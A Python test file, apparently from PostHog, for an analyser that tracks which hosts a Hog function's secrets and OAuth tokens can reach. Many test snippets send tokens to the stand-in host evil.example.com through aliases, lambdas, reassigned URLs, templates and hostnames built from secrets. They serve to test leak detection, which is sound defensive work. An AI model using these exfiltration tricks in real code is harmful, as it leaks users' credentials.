import sys
import json
from collections.abc import Callable, Iterator
from contextlib import AbstractContextManager, contextmanager, nullcontext
from pathlib import Path
from typing import Any

from unittest.mock import patch

from django.test import SimpleTestCase

from parameterized import parameterized

from products.cdp.backend.secret_origins import (
    UNBOUND,
    SecretDestinations,
    SecretOrigins,
    SecretOriginsAnalysis,
    UnanalyzableReason,
    Unbound,
    analyze_secret_origins,
    public_secret_destinations,
    secret_origins,
    secret_reentry_message,
    url_origin,
)

# The Node worker's tests read the same table, so the origin stored here and the origin the worker compares agree.
ORIGIN_CASES = json.loads(
    (Path(__file__).parents[2] / "shared" / "crosslang" / "secret_origin_cases.json").read_text(encoding="utf-8")
)

SENDS_TOKEN_TO_URL = "fetch(inputs.url, {'headers': {'Authorization': inputs.token}})"

WEBHOOK_HOG = """
let payload := {
  'headers': inputs.headers,
  'body': inputs.body,
  'method': inputs.method
}

if (not empty(inputs.signing_secret)) {
  payload['standard_webhooks'] := {
    'secret_input': 'signing_secret'
  }
}

if (not empty(inputs.secret_headers)) {
  payload['secret_headers_input'] := 'secret_headers'
}

let res := fetch(inputs.url, payload);

if (res.status >= 400) {
  throw Error(f'Webhook failed with status {res.status}: {res.body}');
}
"""
REGIONS_TABLE = "let regions := {'US': 'api.intercom.io', 'Europe': 'api.eu.intercom.io', 'AU': 'api.au.intercom.io'}"
REGION_FETCH = (
    "fetch(f'https://{regions[inputs.oauth['app.region']]}/contacts', "
    "{'headers': {'Authorization': f'Bearer {inputs.oauth.access_token}'}})"
)
INTERCOM_REGIONS = f"{REGIONS_TABLE}\n{REGION_FETCH}"
IN_EUROPE = {"app.region": "Europe"}
SENDS_TO_TABLE_IN_EVENT = "fetch(event['event'], {'headers': {'Authorization': f'Bearer {inputs.oauth.access_token}'}})"
SLACK_HOG = """
let res := fetch('https://slack.com/api/chat.postMessage', {
  'body': {'channel': inputs.channel},
  'method': 'POST',
  'headers': {'Authorization': f'Bearer {inputs.slack_workspace.access_token}', 'Content-Type': 'application/json'}
});
"""
SENDS_INSTANCE_TOKEN = (
    "fetch(f'{inputs.oauth.instance_url}/services/data', {'headers': {'Authorization': inputs.oauth.access_token}})"
)


def _inputs(**values: Any) -> dict[str, dict[str, Any]]:
    return {key: {"value": value} for key, value in values.items()}


def _origins(*origins: str) -> frozenset[str]:
    return frozenset(origins)


def _to(*origins: str) -> SecretDestinations:
    return SecretDestinations(hosts=frozenset(origins), built_from=frozenset())


def _built_from(*keys: str) -> SecretDestinations:
    return SecretDestinations(hosts=frozenset(), built_from=frozenset(keys))


# Nesting deep enough to pass the default recursion limit can also pass a parser's own nesting limit,
# which reports the code as unparseable instead. A lower limit keeps the nesting shallow.
@contextmanager
def _recursion_limit_above_here(frames: int) -> Iterator[None]:
    depth, frame = 0, sys._getframe()
    while frame.f_back is not None:
        depth, frame = depth + 1, frame.f_back
    previous = sys.getrecursionlimit()
    sys.setrecursionlimit(depth + frames)
    try:
        yield
    finally:
        sys.setrecursionlimit(previous)


class TestSecretHosts(SimpleTestCase):
    @parameterized.expand(
        [
            (
                "literal_url",
                "fetch('https://api.example.com/v1', {'headers': {'Authorization': inputs.token}})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://api.example.com")},
            ),
            (
                "url_input",
                SENDS_TOKEN_TO_URL,
                _inputs(url="https://hooks.example.com/a", token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "secret_url_input",
                "fetch(inputs.url, {'method': 'POST'})",
                _inputs(url="https://hooks.example.com/abc?key=1"),
                {"url"},
                {"url": _origins("https://hooks.example.com")},
            ),
            (
                "f_string_with_literal_host",
                "fetch(f'https://api.example.com/{event.properties.path}', {'body': inputs.token})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://api.example.com")},
            ),
            (
                "event_controls_the_host",
                SENDS_TOKEN_TO_URL,
                _inputs(url="https://{event.properties.host}/a", token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "host_not_terminated_before_an_unknown_part",
                "fetch(f'https://api.example.com{event.properties.path}', {'body': inputs.token})",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "nullish_fallback",
                "fetch(inputs.url ?? 'https://fallback.example.com', {'body': inputs.token})",
                _inputs(url="https://hooks.example.com/a", token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com", "https://fallback.example.com")},
            ),
            (
                "helper_function",
                """
                fun send(url, body) {
                  return fetch(url, {'body': body})
                }
                send('https://a.example.com', inputs.token)
                send('https://b.example.com', 'ping')
                """,
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://a.example.com", "https://b.example.com")},
            ),
            (
                "fetch_as_a_value",
                "let f := fetch\nf('https://hooks.example.com', {'body': inputs.token})",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "fetch_in_a_lambda_with_a_parameter_url",
                "let send := (u) -> fetch(u, {'body': inputs.token})\nsend('https://hooks.example.com')",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "named_lambda_throws_only_its_arguments",
                "let check := (value) -> { if (not value) { throw Error(f'Missing {value}') } }\n"
                f"check(inputs.url)\n{SENDS_TOKEN_TO_URL}",
                _inputs(url="https://hooks.example.com/a", token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "named_lambda_called_with_a_secret",
                "let send := (x) -> fetch('https://evil.example.com', {'body': x})\nsend(inputs.token)",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://evil.example.com")},
            ),
            (
                "named_lambda_passed_as_a_value",
                "let send := (x) -> fetch('https://evil.example.com', {'body': x})\narrayMap(send, [inputs.token])",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "named_lambda_copied_to_another_name",
                "let send := (x) -> fetch('https://evil.example.com', {'body': x})\nlet other := send\n"
                "other(inputs.token)",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "lambda_passed_to_a_lambda_that_calls_it_with_a_secret",
                "let g := (cb) -> cb(inputs.token)\ng((x) -> fetch('https://evil.example.com', {'body': x}))",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "lambda_passed_to_a_function_that_calls_it_with_a_secret",
                "fun g(cb) { cb(inputs.token) }\ng((x) -> fetch('https://evil.example.com', {'body': x}))",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "function_passed_by_name_to_a_lambda",
                "fun send(x) { fetch('https://evil.example.com', {'body': x}) }\n"
                "let g := (cb) -> cb(inputs.token)\ng(send)",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "reduce_feeds_a_lambda_its_own_result",
                "arrayReduce((acc, x) -> { fetch('https://evil.example.com', {'body': acc})\nreturn inputs.token }, "
                "[1, 2], '')",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "webhook_template_resolves_secrets_by_key_name",
                WEBHOOK_HOG,
                {
                    **_inputs(url="https://hooks.example.com/a", method="POST", body={"event": "{event}"}),
                    **_inputs(signing_secret="whsec", secret_headers={"Authorization": "Bearer t"}),
                },
                {"signing_secret", "secret_headers"},
                {
                    "signing_secret": _origins("https://hooks.example.com"),
                    "secret_headers": _origins("https://hooks.example.com"),
                },
            ),
            (
                "two_secrets_to_two_origins",
                """
                fetch('https://a.example.com', {'headers': {'key': inputs.a_key}})
                fetch('https://b.example.com', {'headers': {'key': inputs.b_key}})
                """,
                _inputs(a_key="a", b_key="b"),
                {"a_key", "b_key"},
                {"a_key": _origins("https://a.example.com"), "b_key": _origins("https://b.example.com")},
            ),
            (
                "secret_used_outside_any_fetch",
                """
                if (sha256Hex(inputs.salt) == event.properties.signature) {
                  fetch('https://hooks.example.com', {'body': event.properties})
                }
                """,
                _inputs(salt="s"),
                {"salt"},
                {"salt": _origins()},
            ),
            (
                "secret_printed",
                f"print(base64Encode(inputs.token))\n{SENDS_TOKEN_TO_URL}",
                _inputs(url="https://hooks.example.com", token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_captured_in_an_event",
                "postHogCapture({'event': 'leak', 'properties': {'value': inputs.token}})",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_in_an_error",
                "throw Error(base64Encode(inputs.token))",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "print_called_through_another_name",
                "let log := print\nlog(inputs.token)",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_returned_to_a_webhook_caller",
                "return {'httpResponse': {'status': 200, 'body': inputs.token}}",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_written_into_the_event",
                "event.properties.salt := inputs.salt",
                _inputs(salt="s"),
                {"salt"},
                {"salt": UNBOUND},
            ),
            (
                "digest_of_a_secret_returned_in_the_event",
                "let e := event\ne.properties.id := sha256Hex(concat(e.properties.id, inputs.salt))\nreturn e",
                _inputs(salt="s"),
                {"salt"},
                {"salt": _origins()},
            ),
            (
                "secret_quoted_by_a_parse_error",
                "jsonParse(base64Encode(inputs.token))",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_quoted_by_a_regex_error",
                "if (event.properties.name =~ inputs.token) { return event }",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_passed_to_an_unknown_worker_function",
                "postHogNotYetWritten(inputs.token)",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_passed_to_a_called_expression",
                "let d := {'log': print}\nd.log(inputs.token)",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_quoted_by_an_input_template",
                "fetch('https://api.example.com', {'headers': {'Authorization': inputs.auth}})",
                _inputs(auth="{jsonParse(inputs.token)}", token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "response_forwarded_to_another_origin",
                f"let r := {SENDS_TOKEN_TO_URL}\nfetch('https://evil.example.com', {{'body': r.body}})",
                _inputs(url="https://hooks.example.com", token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com", "https://evil.example.com")},
            ),
            (
                "input_that_references_a_secret",
                "fetch('https://api.example.com', {'headers': {'Authorization': inputs.auth}})",
                _inputs(auth="Bearer {inputs.token}", token="t"),
                {"token"},
                {"token": _origins("https://api.example.com")},
            ),
            (
                "secret_copied_through_an_index_assignment",
                "let p := {}\np['h'] := inputs.token\nfetch(inputs.url, p)",
                _inputs(url="https://hooks.example.com", token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "options_from_event_data",
                "fetch('https://evil.example.com', jsonParse(event.properties.p))",
                _inputs(secret_headers={"Authorization": "Bearer t"}),
                {"secret_headers"},
                {"secret_headers": _origins("https://evil.example.com")},
            ),
            (
                "computed_option_key",
                "fetch('https://evil.example.com', {concat('secret_', 'headers_input'): concat('secret_', 'headers')})",
                _inputs(secret_headers={"Authorization": "Bearer t"}),
                {"secret_headers"},
                {"secret_headers": _origins("https://evil.example.com")},
            ),
            (
                "secret_assigned_into_a_dict_through_an_alias",
                "let h := {}\nlet a := h\na.Authorization := inputs.token\nfetch('https://evil.example.com', {'headers': h})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://evil.example.com")},
            ),
            (
                "secret_assigned_into_a_dict_through_a_parameter",
                """
                let h := {}
                fun put(d) { d.Authorization := inputs.token }
                put(h)
                fetch('https://evil.example.com', {'headers': h})
                """,
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://evil.example.com")},
            ),
            (
                "secret_assigned_into_a_nested_dict",
                """
                let inner := {}
                let p := {'headers': inner}
                p.headers.Authorization := inputs.token
                fetch('https://evil.example.com', {'headers': inner})
                """,
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://evil.example.com")},
            ),
            (
                "url_input_reassigned",
                f"inputs.url := 'https://evil.example.com'\n{SENDS_TOKEN_TO_URL}",
                _inputs(url="https://hooks.example.com", token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "url_input_reassigned_through_an_alias",
                f"let i := inputs\ni.url := 'https://evil.example.com'\n{SENDS_TOKEN_TO_URL}",
                _inputs(url="https://hooks.example.com", token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_assigned_through_an_alias_and_printed",
                "let h := {}\nlet a := h\na.Authorization := inputs.token\nprint(h)",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "user_function_named_like_concat",
                "fun concat(a, b) { return 'https://evil.example.com/' }\n"
                "fetch(concat('https://hooks.example.com/', 'x'), {'headers': {'Authorization': inputs.token}})",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "lambda_named_like_coalesce",
                "let coalesce := (a, b) -> 'https://evil.example.com/'\n"
                "fetch(coalesce('https://hooks.example.com/a', 'https://hooks.example.com/b'), {'headers': {'Authorization': inputs.token}})",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "function_declared_twice",
                """
                fun send(url, secret) { fetch(url, {'headers': {'Authorization': secret}}) }
                fun unused() {
                  fun send(ignored, copy) { fetch('https://hooks.example.com', {'headers': {'Authorization': copy}}) }
                }
                send('https://evil.example.com', inputs.token)
                """,
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "option_key_assigned_through_an_index",
                "let p := {}\nlet k := concat('secret_', 'headers_input')\np[k] := concat('secret_', 'headers')\n"
                "fetch('https://evil.example.com', p)",
                _inputs(secret_headers={"Authorization": "Bearer t"}),
                {"secret_headers"},
                {"secret_headers": _origins("https://evil.example.com")},
            ),
            (
                "by_name_option_with_a_computed_name",
                "fetch('https://evil.example.com', {'secret_headers_input': concat('secret_', 'headers')})",
                _inputs(secret_headers={"Authorization": "Bearer t"}),
                {"secret_headers"},
                {"secret_headers": _origins("https://evil.example.com")},
            ),
            (
                "fetch_without_arguments",
                "fetch()",
                _inputs(token="t"),
                {"token"},
                {"token": _origins()},
            ),
            (
                "fetch_without_arguments_after_an_aliased_write",
                "let h := {}\nlet a := h\na.x := inputs.token\nfetch()",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "fetch_to_a_url_from_event_data",
                "fetch(event.properties.url, {'body': inputs.token})\nfetch(event.properties.url)",
                _inputs(token="t", salt="s"),
                {"token", "salt"},
                {"token": UNBOUND, "salt": _origins()},
            ),
            (
                "liquid_input_that_dumps_every_input",
                "fetch(inputs.url, {'method': 'POST'})",
                {"url": {"value": "https://evil.example.com/{{ inputs | json }}", "templating": "liquid"}},
                {"api_key"},
                {"api_key": _origins("https://evil.example.com")},
            ),
            (
                "input_that_indexes_a_secret",
                "fetch(inputs.url, {'method': 'POST'})",
                _inputs(url="https://hooks.example.com/{inputs['token']}", token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "secret_serialized_into_a_json_body",
                "fetch('https://api.example.com', {'body': jsonStringify({'k': inputs.token})})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://api.example.com")},
            ),
            (
                # The Node VM reads an input shaped like a date as a date, and its date library quotes
                # an invalid year in the error it throws.
                "secret_converted_to_an_integer",
                "fetch('https://api.example.com', {'body': {'id': toInt(inputs.when)}})",
                _inputs(when={"__hogDate__": True, "year": "{inputs.token}", "month": 1, "day": 1}, token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_converted_to_a_float",
                "fetch('https://api.example.com', {'body': {'rate': toFloat(inputs.when)}})",
                _inputs(when={"__hogDate__": True, "year": "{inputs.token}", "month": 1, "day": 1}, token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_compared_inside_a_date_input",
                "if (inputs.when < 5) { print('soon') }\nfetch('https://api.example.com', {'body': inputs.token})",
                _inputs(when={"__hogDate__": True, "year": "{inputs.token}", "month": 1, "day": 1}, token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_inside_a_date_input_compared_by_range",
                "if (inputs.when between 1 and 2) { print('soon') }\nfetch('https://api.example.com', {'body': inputs.token})",
                _inputs(when={"__hogDate__": True, "year": "{inputs.token}", "month": 1, "day": 1}, token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_inside_a_date_input_compared_by_an_input_template",
                "fetch('https://api.example.com', {'body': inputs.token, 'soon': inputs.note})",
                _inputs(
                    note="{inputs.when between 1 and 2}",
                    when={"__hogDate__": True, "year": "{inputs.token}", "month": 1, "day": 1},
                    token="t",
                ),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_compared_inside_a_date_built_in_code",
                "let d := {'__hogDate__': true, 'year': inputs.token, 'month': 1, 'day': 1}\nlet same := d == 'x'",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "secret_compared_with_a_request_header",
                "if (inputs.token != request.headers['authorization']) { return null }\n"
                "fetch('https://api.example.com', {'body': lower(inputs.token)})",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://api.example.com")},
            ),
            (
                "fetch_in_an_inline_element_callback",
                "arrayMap((x) -> fetch('https://hooks.example.com', {'body': x}), [inputs.token])",
                _inputs(token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "secret_printed_in_an_inline_element_callback",
                "arrayFilter((x) -> { print(x)\nreturn true }, [inputs.token])",
                _inputs(token="t"),
                {"token"},
                {"token": UNBOUND},
            ),
            (
                "response_forwarded_through_a_function",
                f"fun relay(res) {{ return res.body }}\nlet r := {SENDS_TOKEN_TO_URL}\n"
                "fetch('https://evil.example.com', {'body': relay(r)})",
                _inputs(url="https://hooks.example.com", token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com", "https://evil.example.com")},
            ),
            (
                "digest_forwarded_through_a_lambda",
                "let sign := (v) -> sha256Hex(v)\nfetch('https://evil.example.com', {'body': sign(inputs.salt)})",
                _inputs(salt="s"),
                {"salt"},
                {"salt": _origins("https://evil.example.com")},
            ),
            (
                "response_logged_through_a_function",
                f"fun relay(res) {{ return res.body }}\nlet r := {SENDS_TOKEN_TO_URL}\nprint(relay(r))",
                _inputs(url="https://hooks.example.com", token="t"),
                {"token"},
                {"token": _origins("https://hooks.example.com")},
            ),
            (
                "digest_logged_through_a_lambda",
                "let sign := (v) -> sha256Hex(v)\nprint(sign(inputs.salt))",
                _inputs(salt="s"),
                {"salt"},
                {"salt": _origins()},
            ),
            (
                "secret_logged_through_a_lambda",
                "let same := (v) -> v\nprint(same(inputs.salt))",
                _inputs(salt="s"),
                {"salt"},
                {"salt": UNBOUND},
            ),
        ]
    )
    def test_secret_origins(
        self, _name: str, hog: str, inputs: dict, secret_keys: set[str], expected: dict[str, SecretOrigins]
    ) -> None:
        assert secret_origins(hog, inputs, [], secret_keys) == expected

    @parameterized.expand(
        [
            ("unsupported_code", f"let fetch := print\n{SENDS_TOKEN_TO_URL}", {}, nullcontext),
            ("input_cycle", SENDS_TOKEN_TO_URL, {"url": "{inputs.next}", "next": "{inputs.url}"}, nullcontext),
            (
                "iterations",
                f"let u := inputs.url\n{SENDS_TOKEN_TO_URL}",
                {},
                lambda: patch("products.cdp.backend.secret_origins._MAX_ITERATIONS", 1),
            ),
            (
                "budget",
                SENDS_TOKEN_TO_URL,
                {},
                lambda: patch("products.cdp.backend.secret_origins._MAX_EVALUATIONS", 1),
            ),
            (
                "budget",
                "let a0 := 'x'\n"
                + "".join(f"let a{n} := coalesce(a{n - 1}, a{n - 1})\n" for n in range(1, 31))
                + f"let same := a30 == 1\n{SENDS_TOKEN_TO_URL}",
                {},
                nullcontext,
            ),
            ("unparseable", "fetch(inputs.url, {", {}, nullcontext),
            (
                "too_deep",
                f"fetch('https://hooks.example.com', {{'body': {'concat(' * 60}inputs.token{')' * 60}}})",
                {},
                lambda: _recursion_limit_above_here(40),
            ),
        ]
    )
    def test_code_it_cannot_analyze_leaves_its_secrets_unbound(
        self,
        reason: UnanalyzableReason,
        hog: str,
        inputs: dict[str, str],
        limit: Callable[[], AbstractContextManager[Any]],
    ) -> None:
        all_inputs = _inputs(**{"url": "https://hooks.example.com", "token": "t", **inputs})
        with limit():
            analysis = analyze_secret_origins(hog, all_inputs, [], {"token"})

        assert analysis == SecretOriginsAnalysis(origins={"token": UNBOUND}, unanalyzable=reason)

    def test_mapping_inputs_add_their_origins(self) -> None:
        mapping_inputs = [_inputs(url="https://mapped.example.com/a")]

        origins = secret_origins(
            SENDS_TOKEN_TO_URL, _inputs(url="https://hooks.example.com", token="t"), mapping_inputs, {"token"}
        )

        assert origins == {"token": _origins("https://hooks.example.com", "https://mapped.example.com")}

    @parameterized.expand(
        [
            ("https://API.Example.COM./a", _origins("https://api.example.com")),
            # The input is a hog template, which reads the doubled backslash as one literal backslash.
            (r"https://evil.example.com\\@good.example.com/a", UNBOUND),
        ]
    )
    def test_origin_of_a_literal_url(self, url: str, expected: SecretOrigins) -> None:
        assert secret_origins(SENDS_TOKEN_TO_URL, _inputs(url=url, token="t"), [], {"token"}) == {"token": expected}

    @parameterized.expand([(case["url"], case["origin"]) for case in ORIGIN_CASES])
    def test_url_origin_matches_the_worker(self, url: str, origin: str | None) -> None:
        assert url_origin(url, complete=True) == origin

    @parameterized.expand(
        [
            (
                "names_a_host_written_in_the_config",
                SENDS_TOKEN_TO_URL,
                _inputs(url="https://hooks.example.com/a", token="sklive"),
                {"token": _to("https://hooks.example.com")},
            ),
            (
                "names_a_written_host_that_matches_the_secret",
                "fetch('https://sklive.example.com', {'body': inputs.token})",
                _inputs(token="sklive"),
                {"token": _to("https://sklive.example.com")},
            ),
            (
                "names_the_host_of_an_address_with_the_secret_in_its_path",
                "fetch(concat('https://api.example.com/bot', inputs.token, '/send'))",
                _inputs(token="sklive"),
                {"token": _to("https://api.example.com")},
            ),
            (
                "secret_concatenated_into_the_host",
                "fetch(concat('https://leak-', inputs.token, '.example.com'))",
                _inputs(token="sklive"),
                {"token": _built_from("token")},
            ),
            (
                "secret_in_the_host_through_a_variable",
                "let host := concat(inputs.token, '.example.com')\nfetch(concat('https://', host))",
                _inputs(token="sklive"),
                {"token": _built_from("token")},
            ),
            (
                "input_template_puts_the_secret_in_the_host",
                SENDS_TOKEN_TO_URL,
                _inputs(url="https://{inputs.token}.example.com", token="sklive"),
                {"token": _built_from("token")},
            ),
            (
                "secret_is_the_whole_address",
                "fetch(inputs.target, {'body': inputs.token})",
                _inputs(target="https://private.example.com/a", token="sklive"),
                {"token": _built_from("target"), "target": _built_from("target")},
            ),
            (
                "transformed_secret_in_the_host",
                "fetch(concat('https://', lower(inputs.token), '.example.com'))",
                _inputs(token="sklive"),
                {"token": UNBOUND},
            ),
            (
                "address_from_event_data",
                "fetch(concat(event.properties.url, inputs.token))",
                _inputs(token="sklive"),
                {"token": UNBOUND},
            ),
        ]
    )
    def test_public_secret_destinations(
        self, _name: str, hog: str, inputs: dict, expected: dict[str, SecretDestinations | Unbound]
    ) -> None:
        assert public_secret_destinations(hog, inputs, [], set(expected)) == expected

    @parameterized.expand(
        [
            (
                "names_only_the_new_host",
                _to("https://evil.example.com", "https://hooks.example.com"),
                _to("https://hooks.example.com"),
                "This change sends API key to evil.example.com. Until now it was only sent to hooks.example.com.",
            ),
            (
                "keeps_a_port_and_plain_http",
                _to("http://hooks.example.com:8080"),
                _to("https://hooks.example.com:8443"),
                "This change sends API key to http://hooks.example.com:8080. "
                "Until now it was only sent to hooks.example.com:8443.",
            ),
            (
                "caps_a_long_list_after_it_went_nowhere",
                _to(*(f"https://{name}.example.com" for name in "abcde")),
                _to(),
                "This change sends API key to a.example.com, b.example.com, c.example.com and 2 more. "
                "Until now it wasn't sent anywhere.",
            ),
            (
                "unbound_now",
                UNBOUND,
                _to("https://a.example.com", "https://b.example.com"),
                "PostHog can't tell where this change sends API key. "
                "Until now it was only sent to a.example.com and b.example.com.",
            ),
            (
                "unbound_before",
                _to("https://hooks.example.com"),
                UNBOUND,
                "This change sends API key to hooks.example.com. Until now PostHog couldn't tell where it was sent.",
            ),
            (
                "address_built_from_a_secret",
                _built_from("target"),
                _to("https://hooks.example.com"),
                "This change sends API key to an address built from Webhook URL. "
                "Until now it was only sent to hooks.example.com.",
            ),
            (
                "stored_address_built_from_a_secret",
                _to("https://evil.example.com"),
                _built_from("api_key"),
                "This change sends API key to evil.example.com. "
                "Until now it was only sent to an address built from API key.",
            ),
            (
                "same_built_address_on_both_sides",
                _built_from("target"),
                _built_from("target"),
                "This change sends API key to an address built from Webhook URL. "
                "Until now it was only sent to an address built from Webhook URL.",
            ),
        ]
    )
    def test_secret_reentry_message(
        self,
        _name: str,
        now: SecretDestinations | Unbound,
        before: SecretDestinations | Unbound,
        expected: str,
    ) -> None:
        message = secret_reentry_message("api_key", now, before, {"api_key": "API key", "target": "Webhook URL"})

        assert message == f"{expected} Enter it again to confirm."

    @parameterized.expand(
        [
            ("template_host", SLACK_HOG, "slack_workspace", {}, _origins("https://slack.com")),
            (
                "token_sent_elsewhere",
                "fetch('https://evil.example.com/a', {'body': inputs.slack_workspace.access_token})",
                "slack_workspace",
                {},
                _origins("https://evil.example.com"),
            ),
            (
                "raw_token_sent_elsewhere",
                "fetch('https://evil.example.com/a', {'headers': {'X': inputs.slack_workspace.access_token_raw}})",
                "slack_workspace",
                {},
                _origins("https://evil.example.com"),
            ),
            (
                "key_named_by_a_constant",
                "fetch('https://evil.example.com/a', {'body': 'slack_workspace'})",
                "slack_workspace",
                {},
                frozenset(),
            ),
            (
                "whole_connection_sent_elsewhere",
                "let c := inputs.slack_workspace\nfetch('https://evil.example.com/a', {'body': c})",
                "slack_workspace",
                {},
                _origins("https://evil.example.com"),
            ),
            (
                "host_from_its_config",
                SENDS_INSTANCE_TOKEN,
                "oauth",
                {"instance_url": "https://acme.my.salesforce.com"},
                _origins("https://acme.my.salesforce.com"),
            ),
            ("host_missing_from_its_config", SENDS_INSTANCE_TOKEN, "oauth", {}, UNBOUND),
            (
                "host_from_a_constant_table",
                INTERCOM_REGIONS,
                "oauth",
                IN_EUROPE,
                _origins("https://api.eu.intercom.io"),
            ),
            ("constant_table_key_unknown", INTERCOM_REGIONS, "oauth", {}, UNBOUND),
            ("constant_table_key_missing_from_the_table", INTERCOM_REGIONS, "oauth", {"app.region": "Mars"}, UNBOUND),
            (
                "constant_table_key_from_the_event_with_the_host_after_it",
                f"{REGIONS_TABLE}\nfetch(f'https://{{regions[event.properties.region]}}/evil.example.com', "
                "{'headers': {'Authorization': inputs.oauth.access_token}})",
                "oauth",
                IN_EUROPE,
                UNBOUND,
            ),
            (
                "constant_table_declared_in_a_block",
                "if (false) { let event := {'event': 'https://slack.com/api/x'} }\n" + SENDS_TO_TABLE_IN_EVENT,
                "oauth",
                {},
                UNBOUND,
            ),
            (
                "constant_table_declared_in_a_function_body",
                f"fun setup() {{\n{REGIONS_TABLE}\n}}\n{REGION_FETCH}",
                "oauth",
                IN_EUROPE,
                UNBOUND,
            ),
            (
                "constant_table_read_before_its_declaration",
                f"{REGION_FETCH}\n{REGIONS_TABLE}",
                "oauth",
                IN_EUROPE,
                UNBOUND,
            ),
            (
                "constant_table_named_like_a_global",
                "let event := {'event': 'https://slack.com/api/x'}\n" + SENDS_TO_TABLE_IN_EVENT,
                "oauth",
                {},
                UNBOUND,
            ),
            (
                "constant_table_declared_twice",
                f"{REGIONS_TABLE}\nif (true) {{ let regions := {{'US': 'evil.example.com'}} }}\n{REGION_FETCH}",
                "oauth",
                IN_EUROPE,
                UNBOUND,
            ),
            (
                "constant_table_changed",
                "regions['US'] := 'evil.example.com'\n" + INTERCOM_REGIONS,
                "oauth",
                IN_EUROPE,
                UNBOUND,
            ),
            (
                "options_built_elsewhere_for_another_fetch",
                "let opts := {'method': 'POST'}\nfetch('https://evil.example.com/a', opts)\n" + SLACK_HOG,
                "slack_workspace",
                {},
                _origins("https://slack.com"),
            ),
            (
                "public_config_field_passed_to_any_call",
                "let granted := replaceAll(inputs.slack_workspace.scope ?? '', ' ', '')\n"
                "if (has(splitByString(',', granted), 'chat:write')) { print(inputs.slack_workspace['team.name']) }\n"
                + SLACK_HOG,
                "slack_workspace",
                {"scope": "chat:write", "team.name": "Acme"},
                _origins("https://slack.com"),
            ),
            (
                "field_missing_from_the_public_config_printed",
                SLACK_HOG + "print(inputs.slack_workspace.scope)",
                "slack_workspace",
                {},
                UNBOUND,
            ),
            (
                "token_printed",
                SLACK_HOG + "print(inputs.slack_workspace.access_token)",
                "slack_workspace",
                {},
                UNBOUND,
            ),
            (
                "constant_table_aliased",
                INTERCOM_REGIONS + "let other := regions\nother['US'] := 'evil.example.com'",
                "oauth",
                IN_EUROPE,
                UNBOUND,
            ),
        ]
    )
    def test_integration_input_origins(
        self, _name: str, hog: str, key: str, config: dict, expected: SecretOrigins
    ) -> None:
        inputs = {key: {"value": 1}, "channel": {"value": "C1"}}

        assert secret_origins(hog, inputs, [], {key}, {key: config}) == {key: expected}
